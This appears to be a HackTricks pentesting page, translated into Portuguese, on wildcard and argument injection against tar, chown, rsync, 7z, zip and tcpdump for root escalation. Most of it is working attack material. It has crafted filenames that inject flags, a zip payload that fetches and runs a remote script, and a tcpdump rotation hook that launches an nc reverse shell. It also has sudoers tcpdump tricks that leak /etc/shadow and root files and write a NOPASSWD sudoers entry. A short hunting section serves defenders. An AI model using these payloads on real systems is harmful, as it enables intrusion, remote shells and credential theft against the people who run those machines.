# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** acontece quando um script privilegiado executa um binário Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … com um wildcard sem aspas como `*`.
> Como o shell expande o wildcard **antes** de executar o binário, um atacante que consiga criar arquivos no diretório de trabalho pode criar nomes de arquivo que comecem com `-`, de modo que sejam interpretados como **options em vez de data**, efetivamente smuggling arbitrary flags ou até comandos.
> Esta página reúne os primitives mais úteis, pesquisas recentes e detecções modernas para 2023-2025.

## chown / chmod

Você pode **copiar o owner/group ou os permission bits de um arquivo arbitrário** abusando da flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando root depois executa algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` é injetado, fazendo com que *todos* os arquivos correspondentes herdem a propriedade/permissões de `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Veja também o clássico paper da DefenseCode para detalhes.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute arbitrary commands abusando do recurso **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Uma vez que o root executa, por exemplo, `tar -czf /root/backup.tgz *`, `shell.sh` é executado como root.

### bsdtar / macOS 14+

O `tar` padrão em versões recentes do macOS (baseado em `libarchive`) não implementa `--checkpoint`, mas você ainda pode obter execução de código com a flag **--use-compress-program**, que permite especificar um compressor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando um script privilegiado executa `tar -cf backup.tar *`, `/bin/sh` será iniciado.

---

## rsync

`rsync` permite sobrescrever o shell remoto ou até mesmo o binário remoto por meio de flags de linha de comando que começam com `-e` ou `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se root mais tarde arquivar o diretório com `rsync -az * backup:/srv/`, a flag injetada abre sua shell no lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Mesmo quando o script privilegiado, *defensivamente*, prefixa o wildcard com `--` (para impedir a análise de opções), o formato 7-Zip suporta **file list files** ao prefixar o nome do arquivo com `@`.  Combinar isso com um symlink permite *exfiltrar arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root executar algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentará ler `root.txt` (→ `/etc/shadow`) como uma lista de arquivos e vai falhar, **imprimindo o conteúdo para stderr**.

Isso sobrevive a `-- *` porque o CLI do 7-Zip aceita explicitamente tanto nomes de arquivos comuns quanto `@listfiles` como entradas posicionais, então um nome literal como `@root.txt` ainda é tratado de forma especial.

---

## zip

Existem dois primitives muito práticos quando uma aplicação passa nomes de arquivos controlados pelo usuário para `zip` (seja via wildcard ou enumerando nomes sem `--`).

- RCE via test hook: `-T` habilita “test archive” e `-TT <cmd>` substitui o tester por um programa arbitrário (forma longa: `--unzip-command <cmd>`). Se você conseguir injetar nomes de arquivos que comecem com `-`, divida os flags entre arquivos distintos para que o parsing de short-options funcione:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- NÃO tente um único nome de arquivo como `'-T -TT <cmd>'` — opções curtas são analisadas caractere por caractere e isso vai falhar. Use tokens separados como mostrado.
- Se as barras forem removidas dos nomes de arquivos pela app, faça o fetch de um host/IP bruto (caminho padrão `/index.html`) e salve localmente com `-O`, depois execute.
- Você pode depurar o parsing com `-sc` (mostrar argv processado) ou `-h2` (mais ajuda) para entender como seus tokens são consumidos.

Exemplo (comportamento local no zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Se a camada web ecoar `zip` stdout/stderr (comum em wrappers ingênuos), flags injetadas como `--help` ou falhas por opções inválidas aparecerão na resposta HTTP, confirmando command-line injection e ajudando a ajustar o payload.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Os seguintes comandos foram abusados em CTFs modernos e ambientes reais.  O payload é sempre criado como um *filename* dentro de um diretório gravável que depois será processado com um wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Esses primitives são menos comuns do que os clássicos *tar/rsync/zip*, mas valem a pena verificar ao hunting.

---

## Hunting vulnerable wrappers and jobs

Estudos de caso recentes mostraram que wildcard/argv injection não é mais apenas um problema de **cron + tar**. A mesma classe de bug continua aparecendo em:

- recursos web que "download everything as zip/tar" a partir de diretórios de upload controlados pelo atacante
- debug shells de vendor/appliance que expõem um wrapper de **tcpdump** com campos de filename/filter controlados pelo atacante
- jobs de backup ou rotação que chamam `tar`, `rsync`, `7z`, `zip`, `chown`, ou `chmod` em diretórios graváveis

Comandos úteis de triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heurísticas rápidas:

- `-- *` é uma boa correção para muitas ferramentas GNU, mas **não** para `7z`/`7za` porque `@listfiles` são analisados separadamente.
- Para `zip`, procure wrappers que enumerem nomes de arquivos controlados pelo usuário diretamente; o splitting de short-option (`-T` + `-TT <cmd>`) ainda funciona mesmo sem um shell glob.
- Para `tcpdump`, preste atenção especial a wrappers que permitam controlar **nomes de arquivos de saída**, **configurações de rotação** ou argumentos de **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via injeção de argv em wrappers

Quando um restricted shell ou wrapper de fornecedor monta uma linha de comando do `tcpdump` concatenando campos controlados pelo usuário (por exemplo, um parâmetro de "nome de arquivo") sem aspas/validação estritas, você pode infiltrar flags extras do `tcpdump`. A combinação de `-G` (rotação baseada em tempo), `-W` (limita o número de arquivos) e `-z <cmd>` (comando pós-rotação) permite execução arbitrária de comandos como o usuário que está executando o tcpdump (muitas vezes root em appliances).

Pré-requisitos:

- Você consegue influenciar o `argv` passado para `tcpdump` (por exemplo, via um wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- O wrapper não sanitiza espaços nem tokens prefixados com `-` no campo do nome do arquivo.

PoC clássica (executa um script de reverse shell a partir de um caminho gravável):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalhes:

- `-G 1 -W 1` força uma rotação imediata após o primeiro pacote correspondente.
- `-z <cmd>` executa o comando pós-rotação uma vez por rotação. Muitas builds executam `<cmd> <savefile>`. Se `<cmd>` for um script/interpretador, garanta que o tratamento de argumentos corresponda ao seu payload.

Variantes sem mídia removível:

- Se você tiver qualquer outro primitive para escrever arquivos (por exemplo, um wrapper de comando separado que permite redirecionamento de saída), coloque seu script em um path conhecido e acione `-z /bin/sh /path/script.sh` ou `-z /path/script.sh` dependendo da semântica da plataforma.
- Alguns wrappers de vendor rotacionam para locais controláveis pelo atacante. Se você conseguir influenciar o path rotacionado (symlink/directory traversal), você pode direcionar `-z` para executar conteúdo que você controla totalmente sem mídia externa.

---

## sudoers: tcpdump com wildcards/additional args → arbitrary write/read e root

Anti-pattern muito comum em sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemas
- O glob `*` e os padrões permissivos restringem apenas o primeiro argumento `-w`. O `tcpdump` aceita múltiplas opções `-w`; a última vence.
- A regra não fixa outras opções, então `-Z`, `-r`, `-V`, etc. são permitidas.

Primitives
- Substitua o caminho de destino com um segundo `-w` (o primeiro apenas satisfaz o sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal dentro do primeiro `-w` para escapar da árvore restringida:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forçar a propriedade da saída com `-Z root` (cria arquivos pertencentes a root em qualquer lugar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrary-content write by replaying a crafted PCAP via `-r` (e.g., to drop a sudoers line):

<details>
<summary>Create a PCAP that contains the exact ASCII payload and write it as root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Leitura arbitrária de arquivo/leak de segredo com `-V <file>` (interpreta uma lista de savefiles). Diagnósticos de erro geralmente ecoam linhas, vazando conteúdo:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referências

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
